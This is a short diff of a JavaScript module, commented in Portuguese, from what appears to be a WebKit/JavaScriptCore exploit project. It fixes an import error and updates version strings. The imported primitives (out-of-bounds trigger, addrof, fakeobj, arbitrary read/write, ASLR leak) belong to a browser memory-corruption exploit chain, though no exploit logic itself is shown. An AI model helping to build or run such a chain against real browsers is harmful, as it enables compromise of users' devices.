@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v161 - Estratégia: Vazamento ASLR Direto, OOB Persistente)
+// js/script3/testArrayBufferVictimCrash.mjs (v162 - Corrigido Erro de Importação, OOB Persistente)
 // =======================================================================================
 // ESTA VERSÃO FOCA EM:
 // 1. Manter o ambiente OOB persistente entre o selfTest e a exploração principal.
@@ -11,22 +11,23 @@
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    getOOBDataView,
+    getOOBDataView, // Esta função já retorna o oob_dataview_real
     clearOOBEnvironment,
     addrof_core,
     fakeobj_core,
     initCoreAddrofFakeobjPrimitives,
-    arb_read,
-    arb_write,
-    selfTestOOBReadWrite, // Vai manter o ambiente OOB persistente agora
-    oob_read_absolute,
-    oob_write_absolute
+    arb_read, // Usado para operações internas da OOB principal (leitura/escrita de metadados)
+    arb_write, // Usado para operações internas da OOB principal (leitura/escrita de metadados)
+    selfTestOOBReadWrite // Vai manter o ambiente OOB persistente agora
+    // REMOVIDO: oob_array_buffer_real e oob_dataview_real não devem ser importados aqui.
+    // Eles são declarados e modificados no core_exploit.mjs, e acessados via getOOBDataView() (para o DataView)
+    // ou diretamente pelo core_exploit.
 } from '../core_exploit.mjs';
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // ATENÇÃO: Esta constante será atualizada a cada nova versão de teste
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_ASLR_ARBRW_v161_PERSISTENT_OOB";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_ASLR_ARBRW_v162_FIX_IMPORT_ERROR";
 
 // Pausas ajustadas para estabilidade em ambientes com recursos limitados
 const LOCAL_VERY_SHORT_PAUSE = 10;
